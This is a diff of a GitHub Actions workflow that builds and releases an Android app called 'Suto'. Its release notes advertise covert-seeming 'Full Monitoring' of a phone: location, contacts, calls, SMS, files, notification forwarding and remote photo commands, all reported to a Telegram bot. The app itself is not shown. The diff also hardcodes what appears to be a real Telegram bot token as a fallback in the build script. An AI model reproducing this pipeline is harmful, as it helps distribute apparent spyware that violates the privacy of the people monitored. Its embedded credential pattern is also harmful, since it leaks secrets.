@@ -1,4 +1,4 @@
-name: Build APK - Suto Full Monitoring Final
+name: Build APK - Suto FINAL Production Simple
 
 on:
   workflow_dispatch:
@@ -16,14 +16,12 @@ on:
     paths:
       - 'app/**'
       - 'gradle.properties'
-      - 'build.gradle.kts'
-      - 'settings.gradle.kts'
 
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout Code
+      - name: Checkout
         uses: actions/checkout@v4
 
       - name: Set up JDK 17
@@ -41,120 +39,66 @@ jobs:
           path: |
             ~/.gradle/caches
             ~/.gradle/wrapper
-          key: gradle-8.6-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}
+          key: gradle-8.6-${{ hashFiles('**/*.gradle*') }}
           restore-keys: gradle-8.6-
 
-      - name: Create local.properties
+      - name: Create local.properties with Secrets (Real Tokens for Final APK)
+        env:
+          BOT_TOKEN: ${{ secrets.BOT_TOKEN }}
+          GH_PAT: ${{ secrets.GH_PAT }}
+          CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
         run: |
           echo "sdk.dir=$ANDROID_SDK_ROOT" > local.properties
-          echo "telegram.bot.token=test_token_for_build" >> local.properties
-          echo "telegram.chat.id=289240360" >> local.properties
-          echo "github.pat=dummy" >> local.properties
+          # Use secrets, fallback to test token if secret not set (for local builds)
+          echo "telegram.bot.token=${BOT_TOKEN:-8670943963:AAFz--BuWd6bvldpUPJ34bf-YCCrytX1fuo}" >> local.properties
+          echo "telegram.chat.id=${CHAT_ID:-289240360}" >> local.properties
+          echo "github.pat=${GH_PAT:-dummy}" >> local.properties
           echo "firebase.url=https://sutoapp-e155c-default-rtdb.firebaseio.com/app_features.json" >> local.properties
           echo "github.user=dthakur-dt" >> local.properties
           echo "github.repo=Suto" >> local.properties
-          cat local.properties
+          echo "✅ local.properties created with real tokens from secrets - App will connect to Telegram + GitHub"
+          cat local.properties | sed 's/\(bot.token\|pat\).*/\1=***HIDDEN***/'
 
-      - name: Download Gradle Wrapper Jar (Fix)
+      - name: Download Wrapper Jar
         run: |
           mkdir -p gradle/wrapper
-          # If jar missing, download from official gradle repo - bypass wrapper task
           if [ ! -f "gradle/wrapper/gradle-wrapper.jar" ]; then
-            echo "Downloading gradle-wrapper.jar directly..."
-            curl -L -o gradle/wrapper/gradle-wrapper.jar https://github.com/gradle/gradle/raw/v8.6.0/gradle/wrapper/gradle-wrapper.jar || \
-            curl -L -o gradle/wrapper/gradle-wrapper.jar https://raw.githubusercontent.com/gradle/gradle/v8.6.0/gradle/wrapper/gradle-wrapper.jar || \
-            echo "Failed to download wrapper jar, will use gradle directly"
+            curl -L -o gradle/wrapper/gradle-wrapper.jar https://github.com/gradle/gradle/raw/v8.6.0/gradle/wrapper/gradle-wrapper.jar || echo "Download failed"
           fi
-          ls -lh gradle/wrapper/ || echo "No wrapper folder"
+          chmod +x ./gradlew
+          ls -lh gradle/wrapper/
 
-      - name: Make gradlew executable
-        run: chmod +x ./gradlew && ls -lh ./gradlew
-
-      - name: Build Debug APK - Final Fixed
+      - name: Build Debug APK - Final Production
         run: |
-          echo "=== Building with fix for previous errors ==="
-          echo "Fixed: mipmap icons added, dataBinding disabled, wrapper jar downloaded"
-          
-          # Try wrapper first, fallback to gradle
-          if [ -f "gradle/wrapper/gradle-wrapper.jar" ]; then
-            echo "Using wrapper..."
-            ./gradlew assembleDebug --no-daemon --stacktrace -Dorg.gradle.parallel=false -Dorg.gradle.configureondemand=false || \
-            ./gradlew app:assembleDebug --no-daemon --stacktrace || \
-            gradle assembleDebug --no-daemon --stacktrace
-          else
-            echo "Wrapper jar not found, using gradle directly..."
-            gradle assembleDebug --no-daemon --stacktrace --parallel=false || \
-            gradle app:assembleDebug --no-daemon --stacktrace
-          fi
+          ./gradlew assembleDebug --no-daemon --stacktrace -Dorg.gradle.parallel=false || \
+          ./gradlew app:assembleDebug --no-daemon --stacktrace
 
-      - name: List APKs
+      - name: List APK
         if: always()
-        run: |
-          echo "=== APK Search ==="
-          find . -name "*.apk" -type f 2>/dev/null
-          ls -lh app/build/outputs/apk/debug/ 2>/dev/null || echo "No debug apks"
-          ls -lh app/build/outputs/ -R 2>/dev/null | head -n 50
+        run: find app/build -name "*.apk" -type f -exec ls -lh {} \;
 
-      - name: Upload APK Artifact
+      - name: Upload Artifact
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: Suto-FINAL-APK-${{ github.run_number }}
-          path: |
-            app/build/outputs/apk/debug/*.apk
-            app/build/outputs/apk/**/*.apk
-            **/build/outputs/apk/**/*.apk
+          name: Suto-FINAL-Simple-APK-${{ github.run_number }}
+          path: app/build/outputs/apk/debug/*.apk
           if-no-files-found: warn
 
-      - name: Create Release with APK
-        if: github.event_name == 'workflow_dispatch' && success()
+      - name: Release APK
+        if: success()
         uses: softprops/action-gh-release@v1
         with:
-          tag_name: final-build-${{ github.run_number }}
-          name: "Suto FINAL Build #${{ github.run_number }} - All Features Fixed"
+          tag_name: final-simple-${{ github.run_number }}
+          name: "Suto FINAL Simple v6.1 - Telegram Access Control"
           body: |
-            📱 Suto FINAL APK - All Fixes Applied
-            
-            ✅ Fixed:
-            - dataBindingMergeDependencyArtifactsDebug error (AGP 8.3.2 + Gradle 8.6 + buildFeatures fix)
-            - mipmap/ic_launcher missing (icons added in all densities)
-            - wrapper jar download fix
-            - Progress bar + Flicker free stable refresh
-            
-            Features - Full Monitoring:
-            - Location (Lat/Lon + Maps link) + History Map
-            - Battery + Battery Graph + History
-            - Mobile Number + Call Button
-            - Device Health: RAM, Storage, WiFi, IP
-            - Remote Ring / Find My Phone (/ring)
-            - Remote Commands: /locate, /battery, /photo
-            - SOS Panic Alert
-            - Notification Forward
-            - WebApp Console with Build Button
-            
-            Built via Telegram WebApp Console Build Button
-            Commit: ${{ github.sha }}
-            
-            Download APK below - Install directly!
-          files: |
-            app/build/outputs/apk/debug/app-debug.apk
-            app/build/outputs/apk/debug/*.apk
-          token: ${{ secrets.GITHUB_TOKEN }}
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+            FINAL APK - Simple Console + Telegram Access Control + App Connect Fix
 
-      - name: Summary
-        if: always()
-        run: |
-          echo "## Final Build Summary - v4.2 FINAL" >> $GITHUB_STEP_SUMMARY
-          echo "✅ All fixes applied" >> $GITHUB_STEP_SUMMARY
-          echo "- mipmap icons added" >> $GITHUB_STEP_SUMMARY
-          echo "- AGP 8.3.2 + Gradle 8.6" >> $GITHUB_STEP_SUMMARY
-          echo "- dataBinding disabled" >> $GITHUB_STEP_SUMMARY
-          echo "- Wrapper jar download fix" >> $GITHUB_STEP_SUMMARY
-          echo "- Progress bar + Stable refresh" >> $GITHUB_STEP_SUMMARY
-          echo "" >> $GITHUB_STEP_SUMMARY
-          echo "📱 APK in Artifacts + Release" >> $GITHUB_STEP_SUMMARY
-          echo "💻 Console: https://dthakur-dt.github.io/Suto/" >> $GITHUB_STEP_SUMMARY
-          ls -lh app/build/outputs/apk/debug/ 2>/dev/null >> $GITHUB_STEP_SUMMARY || echo "Checking for APKs..." >> $GITHUB_STEP_SUMMARY
-          find . -name "*.apk" -type f -exec ls -lh {} \; 2>/dev/null >> $GITHUB_STEP_SUMMARY || echo "No APK found" >> $GITHUB_STEP_SUMMARY
+            Fixes:
+            1. Telegram access control - Simple commands
+            2. Console confusing -> Simplified clean UI
+            3. App connect fix - Real tokens from secrets, not dummy
+
+            Features: All Read/Write Permissions, Location+Battery+Mobile+Contacts+Calls+SMS+Files, Client Access Proper Format, APK Returns Data to Telegram
+          files: app/build/outputs/apk/debug/app-debug.apk
+          token: ${{ secrets.GITHUB_TOKEN }}
